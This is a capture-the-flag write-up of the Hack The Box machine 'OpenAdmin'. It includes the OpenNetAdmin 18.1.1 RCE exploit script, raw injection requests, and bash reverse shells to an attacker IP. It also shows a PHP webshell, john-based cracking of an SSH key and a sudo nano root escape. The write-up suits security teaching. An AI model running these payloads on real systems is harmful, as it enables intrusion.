### Summary
We start this box by enumerating subdirectories until we're directed to a guest login of an outdated version of `OpenNetAdmin` vulnerable to command injection which grants us a foothold on the machine as `www-data`. We can access configuration files to find credentials that allows us to switch to the user `jimmy`. From here, we can inspect the `apache` configuration to find an internal site being run as the user `joanna`. We can either write a webshell into the site or inspect the files to find hashed, crackable credentials for the login page, giving us an encrypted `rsa` key which we can crack with `john`. Either way, with a foothold as the user `joanna`, we can use passwordless sudo on `nano`, giving us an easy avenue to `root`!

### Tools
- `feroxbuster`
- `ssh` tunneling
- `openssl`
- `ssh2john` - convert decrypted rsa to brute-forceable hash
- `john` - rsa key brute-force

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80]]
	- [[#Open Net Admin]]
	- [[#poc.sh]]
###### [[#User Shell - www-data]]
- [[#CVE-2019-3980]]
- [[#Recon]]
	- [[#MySQL - TCP 3306]]
###### [[#User Shell - jimmy]]
- [[#Reused Credentials]]
###### [[#User Shell - joanna]]
- [[#Internal Site - TCP 52846]]
	- [[#Apache Config]]
	- [[#SSH Tunnel]]
	- [[#Web Shell]]
###### [[#Root Shell]]
- [[#Enumeration]]
- [[#GTFObins Nano]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.48.248 -oN nmap/tcp             
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

❯ sudo nmap -p 22,80 -sCV -vv 10.129.48.248 -oN nmap/tcpScripts             
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- UDP scan shows nothing
- `OpenSSH 7.6p1` and `Apache httpd 2.4.29` indicate Ubuntu `18.04`

## Web - TCP 80
---
- Navigating to the website shows a default apache configuration
- We can brute-force subdirectories with `feroxbuster`:
```sh
❯ feroxbuster -u "http://10.129.48.248" -x html,php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt
```
- We get a ton of shit, mainly because of directory crawling:
	- `http://10.129.48.248/music/`
	- `http://10.129.48.248/ona/`
	- `http://10.129.48.248/artwork/`
	- `http://10.129.48.248/sierra/`

### Open Net Admin
- When we navigate to `http://10.129.48.248/ona/` we see a guest login of the `Open Net Admin` portal
![[Pasted image 20251229155932.png]]
- We can see that there's a `DNS Domain` `openadmin.htb` but it has no visible records
- We also see that this is an outdated version of the software, `v18.1.1`
- A quick search via `searchsploit` shows an interesting potential exploit here:
```sh
❯ searchsploit -m 47691      
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /opt/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/aldamd/ctf/htb/OpenAdmin - 10.129.48.248/47691.sh
```

### poc.sh
```sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
- It doesn't make much sense at first but after reading the [POC instructions on github](https://github.com/CyberQuestor-infosec/CVE-2019-3980-Open_Net_Admin_v18.1.1_RCE) and routing it through BURP to capture the request:
```sh
❯ http_proxy="http://127.0.0.1:8080" ./47691.sh "http://10.129.48.248/ona/"
$ whoami
www-data
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
```
```http
POST /ona/ HTTP/1.1
Host: 10.129.48.248
User-Agent: curl/8.9.1
Accept: */*
Content-Length: 126
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";ls;echo "END"&xajaxargs[]=ping
```
```xml
<?xml version="1.0" encoding="utf-8" ?><xjx><cmd n="js"><![CDATA[removeElement('tooltips_results');]]></cmd><cmd n="ce" t="window_container" p="tooltips_results"><![CDATA[div]]></cmd><cmd n="js"><![CDATA[initialize_window('tooltips_results');el('tooltips_results').style.display = 'none';el('tooltips_results').style.visibility = 'hidden';el('tooltips_results').onclick = function(ev) { focus_window(this.id); };]]></cmd><cmd n="as" t="tooltips_results" p="innerHTML"><![CDATA[
        <!-- This wrapper table is so that internal tables can be set to 100% width and they won't stretch the box too wide. -->
        <table id="tooltips_results_table" cellspacing="0" border="0" cellpadding="0">
        <tr>
        <td>

            <!-- Window bar and close button -->
            <table id="tooltips_results_title_table" class="window_title" style="border-bottom: 1px solid #69A6DE;background-color: #69A6DE;" width="100%" cellspacing="0" border="0" cellpadding="0">
            <tr>

                <td id="tooltips_results_title"
                    width="99%"
                    align="left"
                    nowrap="true"
                    onMouseDown="focus_window('tooltips_results'); dragStart(event, 'tooltips_results');"
                    style="cursor: move;
                           white-space: nowrap;
                           font-weight: bold;
                           text-align: left;
                           padding: 2px 4px;">Ping Results</td>

                <td id="tooltips_results_title_r"
                    align="right"
                    nowrap="true"
                    style="color: #294157;
                           white-space: nowrap;
                           text-align: right;
                           padding: 2px 4px;"><span id="tooltips_results_title_help"></span>&nbsp;<a title="Close window" style="cursor: pointer;" onClick="removeElement('tooltips_results');"><img src="/ona/images/icon_close.gif" border="0" /></a></td>

            </tr>
            </table>
<!-- Module Output -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td align="left" class="padding">
            <br>
            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                <pre style="padding: 4px;font-family: monospace;">BEGIN
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
END
</pre>
            </div>
        </td>
    </tr>
</table>

<!-- Just a little padding -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td id="tooltips_extras" align="center" class="padding"><input type="button" class="edit" name="Close" value="Close" onclick="removeElement('tooltips_results');"><br></td>
    </tr>
</table>
        </td>
        </tr>
        </table>]]></cmd><cmd n="js"><![CDATA[toggle_window('tooltips_results');]]></cmd></xjx>
```
- The exploit works by utilizing the `xajax` AJAX request interface. The vulnerability is from improper input sanitization in the `xajaxargs[]` parameter, allowing for RCE

# User Shell - www-data
## CVE-2019-3980
---
- We can use this RCE to prompt a bash reverse shell:
```sh
❯ http_proxy="http://127.0.0.1:8080" ./47691.sh "http://10.129.48.248/ona/"
$ bash -i >& /dev/tcp/10.10.14.50/12345 0>&1
$ bash -c 'bash -i >& /dev/tcp/10.10.14.50/12345 0>&1'
$ 
```
- Neither of these payloads work to trigger the shell, let's take a look in BURP to see what's going on:
```http
POST /ona/ HTTP/1.1
Host: 10.129.48.248
User-Agent: curl/8.9.1
Accept: */*
Content-Length: 176
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";bash -c 'bash -i >& /dev/tcp/10.10.14.50/12345 0>&1';echo "END"&xajaxargs[]=ping
```
- We can try URL encoding the command and see if that rectifies:
```http
POST /ona/ HTTP/1.1
Host: 10.129.48.248
User-Agent: curl/8.9.1
Accept: */*
Content-Length: 176
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo "BEGIN";bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.50/12345+0>%261';echo "END"&xajaxargs[]=ping
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.48.248.
Ncat: Connection from 10.129.48.248:38942.
bash: cannot set terminal process group (1417): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ whoami
whoami
www-data
```
- And we've got a shell!

- We can try to grab user.txt:
```sh
www-data@openadmin:/opt/ona/www$ find / -name "user.txt" 2>/dev/null
www-data@openadmin:/opt/ona/www$ 
```
- But we get nothing :(

## Recon
---
- We can inspect the config files of the web application and we find something interesting in `/opt/ona/www/local/config/database_settings.inc.php`:
```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```
- Looks like we've got some database creds, `ona_sys:n1nj4W4rri0R!`

### MySQL - TCP 3306
- We can attempt to use the `mysql` command line using the credentials we just uncovered:
```sh
www-data@openadmin:/opt/ona/www$ mysql --user ona_sys -pn1nj4W4rri0R!
mysql>
```
- And it worked!
```sh
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default
Database changed

mysql> SHOW TABLES;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+----------------------------------
| id | username | password                         
+----+----------+----------------------------------
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 
+----+----------+----------------------------------
2 rows in set (0.00 sec)
```

- We can plug both hashes into [crackstation](https://crackstation.net/) and find that the credentials are:
	- `guest:test`
	- `admin:admin`
- Navigating back to `http://10.129.48.248/ona/` and inputting the `admin:admin` credentials gives us no new options

# User Shell - jimmy
## Reused Credentials
---
- We can attempt to use the database password `n1nj4W4rri0R!` to log in as the user `jimmy`:
```sh
www-data@openadmin:/opt/ona/www$ su - jimmy
Password: 
jimmy@openadmin:~$ 
```

- We can check which directories we own with:
```sh
jimmy@openadmin:~$ find / -user $(whoami) 2>/dev/null
```
- An interesting one is `/var/www/internal` where stored is an `index.php`:
```php
jimmy@openadmin:/var/www/internal$ cat index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```
- We can throw the `sha-512` hash into crackstation to find that it's the hash of `Revealed`

# User Shell - joanna
## Internal Site - TCP 52846
---
- We know that there are files for an internal webpage that `jimmy` is an administrator of
- We can observe that the following ports are in use:
```sh
jimmy@openadmin:/var/www/internal$ ss -lptn
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
LISTEN   0         128               127.0.0.1:52846            0.0.0.0:*       
LISTEN   0         128                    [::]:22                  [::]:*       
LISTEN   0         128                       *:80                     *:*       
```
- We don't know what port `52846` is, but we can probe with `nc` to see that it hangs, and verify that its `HTTP` with `curl`:
```sh
jimmy@openadmin:/var/www/internal$ curl http://localhost:52846

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">
...
```

### Apache Config
- We can also verify that there's another web site running internally by checking the `apache` sites-enabled config:
```sh
jimmy@openadmin:/var/www/internal$ ls /etc/apache2/sites-enabled/
internal.conf  openadmin.conf
jimmy@openadmin:/var/www/internal$ cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```
- Interesting that the site is being run as the user `joanna`!
### SSH Tunnel
- We can create an `ssh` tunnel to the internal site, allowing us to access it externally with the following command:
```sh
❯ ssh jimmy@10.129.48.248 -L 52846:localhost:52846
```
- This creates a tunnel between the box's port `52846` and our localhost's port `52846`
- Now, when we access `http://localhost:52846/` we're really navigating to the internal `http://10.129.48.248:52846/`

- When accessing the internal site, we're faced with a primitive looking login portal:
![[Pasted image 20251229191443.png]]

- We can utilize what we learned from `/var/www/internal/index.php` to utilize the credentials `jimmy:Revealed`
- When we log in, we get the following page:
```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----

### Don't forget your "ninja" password

Click here to logout [Session](http://localhost:52846/logout.php)
```
- Given by the hint text, we can use `openssl` along with the `n1nj4W4rri0R!` password to decrypt this key:
```sh
❯ openssl rsa -in key_enc -out key_dec
Enter pass phrase for key_enc:
Could not find private key from key_enc
40F7016CBD7F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:providers/implementations/ciphers/ciphercommon_block.c:107:
40F7016CBD7F0000:error:04800065:PEM routines:PEM_do_header:bad decrypt:crypto/pem/pem_lib.c:472:
```
- but it fails :(

- We know `ninja` is involved in the password, we can grab items from `rockyou.txt` that have `ninja` in the name:
```sh
❯ cat ~/ctf/TOOLS/wordlist/rockyou.txt | grep -i ninja > rockyou_ninja.txt
```
- And then we can use `john` to crack the key
```sh
❯ ~/ctf/TOOLS/john/run/ssh2john.py key_enc > key_enc.hash
❯ john key_enc.hash --wordlist=rockyou_ninja.txt
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 3DES/AES 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 22 OpenMP threads
Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
bloodninjas      (key_enc)     
1g 0:00:00:00 DONE (2025-12-29 19:27) 20.00g/s 31680p/s 31680c/s 31680C/s gingerninjas..Ninja140579
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- It quickly uncovers the hash password, `bloodninjas`. We can now use `openssl` to decrypt the `rsa` key:
```sh
❯ openssl rsa -in key_enc -out key_dec
Enter pass phrase for key_enc: # using the password bloodninjas
writing RSA key
```

- We can try to use this decrypted `rsa` key with the other user, `joanna`
```sh
❯ ssh -i ./key_dec joanna@10.129.48.248
joanna@openadmin:~$ 
```
- It worked! We can grab `user.txt` now:
```sh
joanna@openadmin:~$ cat user.txt 
aedf8b6e50109ddc212f698aafa25bcc
```

### Web Shell
- Another way we could've gotten execution as `joanna` is by writing a webshell into the `internal` site directory
```sh
jimmy@openadmin:/var/www/internal$ echo "<?php system($_GET['cmd']); ?>" > webshell.php
jimmy@openadmin:/var/www/internal$ curl "http://localhost:52846/webshell.php?cmd=id"
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```
- We can manifest a reverse shell with the following command:
```sh
jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/webshell.php?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E50%2F12345%200%3E%261%27
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.48.248.
Ncat: Connection from 10.129.48.248:42894.
bash: cannot set terminal process group (1417): Inappropriate ioctl for device
bash: no job control in this shell
joanna@openadmin:/var/www/internal$ 
```

# Root Shell
## Enumeration
---
- We check all directories owned by the user `joanna` but nothing pops out
- We can check for passwordless sudo:
```sh
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
- It looks like we can run `nano` with passwordless `sudo` on the file `/opt/priv`

## GTFObins Nano
---
- We can inspect [GTFObins](https://gtfobins.github.io/gtfobins/nano/) for nano privesc routes:
> If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```sh
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
- If we run the above command, we get a shell as root!
```sh
root@openadmin:/home/joanna# cat /root/root.txt 
27b06a3b69479023aa45f250227631d2
```

